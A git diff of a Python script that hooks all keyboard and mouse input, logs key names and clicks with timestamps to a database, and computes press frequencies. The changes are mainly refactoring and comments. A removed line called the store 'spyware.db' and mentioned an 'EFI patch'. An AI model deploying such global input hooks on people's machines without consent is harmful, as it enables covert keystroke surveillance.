@@ -2,19 +2,19 @@ import time
 
 import mouse
 import keyboard
-from typing import Union
+from typing import Union, Any
 import json
 from helpers.Database import Database
 import threading
 
 
-def keyboard_callback(key: keyboard.KeyboardEvent):
+def keyboard_callback(key: keyboard.KeyboardEvent) -> None:
     global db
     db.insert(table="keys", key=key.name.lower(), down=int(key.event_type == keyboard.KEY_DOWN),
                   time=str(key.time))
 
 
-def mouse_callback(event: Union[mouse.ButtonEvent, mouse.MoveEvent, mouse.WheelEvent]):
+def mouse_callback(event: Union[mouse.ButtonEvent, mouse.MoveEvent, mouse.WheelEvent]) -> None:
     global db
     if isinstance(event, mouse.ButtonEvent):
         db.insert(table="mouse_buttons", button=event.button, event=event.event_type, time=event.time)
@@ -24,44 +24,74 @@ def mouse_callback(event: Union[mouse.ButtonEvent, mouse.MoveEvent, mouse.WheelE
     #     db.insert(table="mouse_wheel", delta=event.delta, time=event.time)
 
 
-def key_parse():
+def key_parse() -> dict:
     global db
-    keys = [dict(i) for i in db.execute(f"SELECT * FROM keys WHERE {time.time()} - time <= 60000").fetchall()]
+
+    # converts each row from database response to dictionary, only returning values within check_rate
+    keys = [dict(i) for i in db.execute(f"SELECT * FROM keys WHERE {time.time()} - time <= {config['check_rate']}").fetchall()]
+
+    # used for filtering rows by key
     uniq_keys = []
+
+    # supposedly sorts by key
     keys = sorted(keys, key=lambda x: x["key"])
+
+    # get all keys pressed
     for i in keys:
         uniq_keys.append(i["key"])
+
+    # filter out duplicates
     uniq_keys = list(set(uniq_keys))
-    frequency = {}
+
+    # return value, key: amount
+    frequency = {k: 0 for k in uniq_keys}
+
     for key in uniq_keys:
-        if key not in frequency.keys():
-            frequency[key] = 0
         for row in keys:
+            # only downpress
             if row["key"] == key and row["down"] == 1:
                 frequency[key] += 1
-    return json.dumps(frequency)
+
+    # return json.dumps(frequency)
+    return frequency
 
 
-def mouse_button_parse():
+def mouse_button_parse() -> dict:
     global db
-    buttons = [dict(i) for i in db.execute(f"SELECT * FROM mouse_buttons WHERE {time.time()} - time <= 60000").fetchall()]
+    # converts each row from database response to dictionary, only returning values within check_rate
+    buttons = [dict(i) for i in db.execute(f"SELECT * FROM mouse_buttons WHERE {time.time()} - time <= {config['check_rate']}").fetchall()]
+
+    # used for filtering row by button
     uniq_buttons = []
-    keys = sorted(buttons, key=lambda x: x["time"])
-    for i in keys:
+
+    # get all buttons pressed
+    for i in buttons:
         uniq_buttons.append(i["button"])
-    uniq_keys = list(set(uniq_buttons))
-    frequency = {}
-    for button in uniq_keys:
-        if button + "_single" not in frequency.keys():
-            frequency[button + "_single"] = 0
-            frequency[button + "_double"] = 0
-        for row in keys:
+
+    # remove duplicates
+    uniq_buttons = list(set(uniq_buttons))
+
+    # modified button names
+    uniq_modified = []
+    for i in uniq_buttons:
+        uniq_modified.append(i + "_single")
+        uniq_modified.append(i + "_double")
+
+    # return value, button: amount
+    # dict comprehension guarantees default value
+    frequency = {k: 0 for k in uniq_modified}
+
+    for button in uniq_buttons:
+        for row in buttons:
+            # single click handling
             if row["button"] == button and row["event"] == mouse.DOWN:
                 frequency[button + "_single"] += 1
+            # double click handling
             elif row["button"] == button and row["event"] == mouse.DOUBLE:
                 frequency[button + "_double"] += 1
 
-    return json.dumps(frequency)
+    # return json.dumps(frequency)
+    return frequency
 
 
 # def mouse_move_parse():
@@ -79,7 +109,13 @@ def mouse_button_parse():
 #     return json.dumps(jso)
 
 
-def safe_call(func: callable):
+def safe_call(func: callable) -> Any:
+    """
+    Assures thread-safe reads/writes to the database
+
+    :param func: the unsafe function
+    :return: Return value of func
+    """
     ret = None
     try:
         lock.acquire(True)
@@ -91,16 +127,17 @@ def safe_call(func: callable):
 
 lock = threading.Lock()
 CONFIG_FILE = "config.json"
-DATABASE_FILE = "spyware.db"  # TODO: make spyware.json EFI patch
+
 with open(CONFIG_FILE, 'r') as config:
     config = json.load(config)
+
+
+DATABASE_FILE = config["database_file"]
 db = Database(DATABASE_FILE)
 
+#  lambda function allows for passing safe_call into the keyboard hook instead of the keyboard callback directly
 keyboard.hook(lambda y: safe_call(lambda: keyboard_callback(y)))
 mouse.hook(lambda y: safe_call(lambda: mouse_callback(y)))
-# time.sleep(10)
 
 print(safe_call(key_parse))
 print(safe_call(mouse_button_parse))
-# print(safe_call(mouse_wheel_parse))
-# print(safe_call(mouse_move_parse))
